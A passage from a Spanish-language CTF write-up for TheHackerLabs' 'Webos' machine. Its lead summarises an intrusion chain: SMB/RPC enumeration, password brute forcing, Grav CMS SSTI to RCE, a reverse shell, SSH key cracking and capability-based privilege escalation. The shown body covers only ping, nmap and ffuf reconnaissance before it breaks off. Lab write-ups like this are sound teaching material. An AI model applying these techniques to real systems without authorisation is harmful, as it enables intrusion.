@@ -1,0 +1,1325 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Webos - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-webos/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Webos - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-webos/webos.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-melonJamon/">
+          <span class="side-post-card-title">MelonJamón</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-casaPaco/">
+          <span class="side-post-card-title">Casa Paco</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Webos</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-runners/">
+          <span class="side-post-card-title">Runners</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-cachopo/">
+          <span class="side-post-card-title">Cachopo</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>Webos - TheHackerLabs</h1>
+    <div class="post-meta">4 August 2025 · 18 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-webos/webos.png" alt="Webos - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina un poco complicada. Después de analizar los escaneos, identificamos que se está usando el CMS Grav en la página web activa en el puerto 80, y que necesitamos credenciales válidas para poder ver los recursos compartidos del servicio Samba. Al ver el servicio RPC activo, logramos entrar con una sesión nula, lo que nos permite enumerar los usuarios, siendo así que encontramos un usuario válido al que le aplicamos fuerza bruta con crackmapexec, logrando encontrar su contraseña. Ya con credenciales válidas, enumeramos el servicio Samba, encontrando un archivo de texto que contiene un mensaje codificado en brainfuck. Decodificando ese mensaje, descubrimos que son credenciales para el CMS Grav, con lo que logramos ganar acceso y descubriendo que se está usando la versión 1.7.44. Investigando por internet, encontramos que esta versión es vulnerable a Server Side Template Injection (SSTI), lo que provoca Ejecución Remota de Comandos (RCE). Encontramos dos Exploits que utilizamos para ejecutar comandos y poder enviarnos una Reverse Shell para ganar acceso a la máquina víctima. Dentro, encontramos una llave privada id_rsa que logramos crackear con JohnTheRipper y ganamos acceso a la máquina vía SSH. Dentro del SSH, encontramos el binario python3 en el directorio de nuestro usuario. Si investigamos sus capabilities, descubrimos que tiene la capabilitie cap_setuid, con lo que podemos abusar de este binario para escalar privilegios. Utilizamos un comando de la guía de GTFOBins para abusar de esa capabilitie, logrando convertirnos en Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>Wappalizer</code></li><li><code>ffuf</code></li><li><code>crackmapexec</code></li><li><code>smbmap</code></li><li><code>rpcclient</code></li><li><code>cat</code></li><li><code>wget</code></li><li><code>python3</code></li><li><code>nc</code></li><li><code>bash</code></li><li><code>tcpdump</code></li><li><code>nano</code></li><li><code>chmod</code></li><li><code>ssh2john</code></li><li><code>JohnTheRipper</code></li><li><code>ssh</code></li><li><code>id</code></li><li><code>find</code></li><li><code>getcap</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing y Análisis de Directorios Descubiertos</a></li>
+        <li><a href="#SambaRPC">Análisis del Servicio Samba y Enumeración de Servicio RPC</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#FuerzaBrutaEnumSamba">Aplicando Fuerza Bruta y Enumeración del Servicio Samba</a></li>
+        <li><a href="#brainfuck">Decodificación de Mensaje Codificado en Brainfuck y Ganando Acceso a Login de CMS Grav</a></li>
+        <li><a href="#CVE">Abusando de Version Vulnerable del CMS Grav</a>
+          <ul>
+            <li><a href="#Exploit1">Probando Exploit: Graver.py - Explotando un SSTI + RCE</a></li>
+            <li><a href="#Exploit2">Probando Exploit: Grav CMS Remote Code Execution (Authenticated) - CVE-2024-28116</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina Víctima y Crackeo de Llave Privada id_rsa</a></li>
+        <li><a href="#Python3">Escalando Privilegios Abusando de Capabilities de Binario Python3</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing y Análisis de Directorios Descubiertos</a></li>
+        <li><a href="#SambaRPC">Análisis del Servicio Samba y Enumeración de Servicio RPC</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#FuerzaBrutaEnumSamba">Aplicando Fuerza Bruta y Enumeración del Servicio Samba</a></li>
+        <li><a href="#brainfuck">Decodificación de Mensaje Codificado en Brainfuck y Ganando Acceso a Login de CMS Grav</a></li>
+        <li><a href="#CVE">Abusando de Version Vulnerable del CMS Grav</a>
+          <ul>
+            <li><a href="#Exploit1">Probando Exploit: Graver.py - Explotando un SSTI + RCE</a></li>
+            <li><a href="#Exploit2">Probando Exploit: Grav CMS Remote Code Execution (Authenticated) - CVE-2024-28116</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina Víctima y Crackeo de Llave Privada id_rsa</a></li>
+        <li><a href="#Python3">Escalando Privilegios Abusando de Capabilities de Binario Python3</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.100.10
+</span></span><span style="display:flex;"><span>PING 192.168.10.10 <span style="color:#f92672">(</span>192.168.100.10<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.75 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.981 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.00 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.04 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.100.10 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3106ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.981/1.191/1.746/0.320 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.100.10 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-08-04 12:15 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 12:15
+</span></span><span style="display:flex;"><span>Scanning 192.168.100.10 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 12:15, 0.08s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:15
+</span></span><span style="display:flex;"><span>Scanning 192.168.100.10 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.100.10
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.100.10
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.100.10
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.100.10
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:15, 24.53s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.10
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00100s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-08-04 12:15:15 CST <span style="color:#66d9ef">for</span> 25s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">54945</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">10586</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE      REASON
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh          syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http         syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn  syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 24.78 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">82363</span> <span style="color:#f92672">(</span>3.624MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">54953</span> <span style="color:#f92672">(</span>2.198MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Tenemos 4 puertos abiertos, pero me da mucha curiosidad e interés el ver el <strong>servicio SMB/Samba</strong> activo, pues no es tan común verlo en una máquina <strong>Linux</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,80,139,445 192.168.100.10 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-08-04 12:17 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.10
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00090s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> d1:ab:7b:af:5c:3b:5e:52:23:9a:97:57:a8:aa:a1:f5 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 73:d9:ad:9e:c0:96:12:d8:ed:1b:ee:c0:15:ba:34:98 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http        Apache httpd 2.4.59 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.59 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: webos.thl | Grav
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">13</span> disallowed entries 
+</span></span><span style="display:flex;"><span>| /.github/ /.phan/ /assets/ /backup/ /bin/ /cache/ /logs/ 
+</span></span><span style="display:flex;"><span>|_/system/ /tests/ /tmp/ /user/ /vendor/ /webserver-configs/
+</span></span><span style="display:flex;"><span>|_http-generator: GravCMS
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: THE HACKERS LABS - WEBOS<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd 4.17.12-Debian <span style="color:#f92672">(</span>workgroup: THE HACKERS LABS - WEBOS<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: THEHACKERSLABS-WEBOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: , NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.17.12-Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: thehackerslabs-webos
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: THEHACKERSLABS-WEBOS<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: 
+</span></span><span style="display:flex;"><span>|   FQDN: thehackerslabs-webos
+</span></span><span style="display:flex;"><span>|_  System time: 2025-08-04T20:18:01+02:00
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-08-04T18:18:01
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.13 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Viendo el escaneo, la página web activa en el <strong>puerto 80</strong> muestra bastante contenido como el uso del <strong>CMS Grav</strong> y un dominio <strong>webos.thl</strong>.</p>
+<p>Agrega ese dominio al <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;192.168.100.10 webos.thl&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>Además, el escaneo utilizó el <strong>usuario guest</strong> para intentar entrar al <strong>servicio Samba</strong>, aunque parece que funcionó, no reporto nada.</p>
+<p>Vamos a ver primero la página web y después analizaremos el <strong>servicio Samba</strong>.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura1.png">
+</p>
+<p>Estamos ante el login del <strong>CMS Grav</strong>.</p>
+<p>Investiguemos de qué se trata este <strong>CMS</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>CMS Grav</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Grav es un CMS (Content Management System) de tipo flat-file, lo que significa que no utiliza una base de datos tradicional como MySQL o PostgreSQL. En lugar de eso, almacena el contenido en archivos de texto (principalmente Markdown) dentro de una estructura de carpetas organizada.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Bastante curioso este <strong>CMS</strong>.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura2.png">
+</p>
+<p>Nos reporta el uso del <strong>CMS Grav</strong> y que está hecho en <strong>PHP</strong>.</p>
+<p>Esto es bastante útil, pues podemos aplicar <strong>Fuzzing</strong> y enfocarlo en <strong>archivos PHP</strong>.</p>
+<h3 id="fuzz">Fuzzing y Análisis de Directorios Descubiertos</h3>
+<p>Por alguna razón, tarda demasiado el <strong>Fuzzing</strong>, por lo que solamente lo haré con la herramienta <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.10/FUZZ -t <span style="color:#ae81ff">300</span> -e .php,.txt,.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
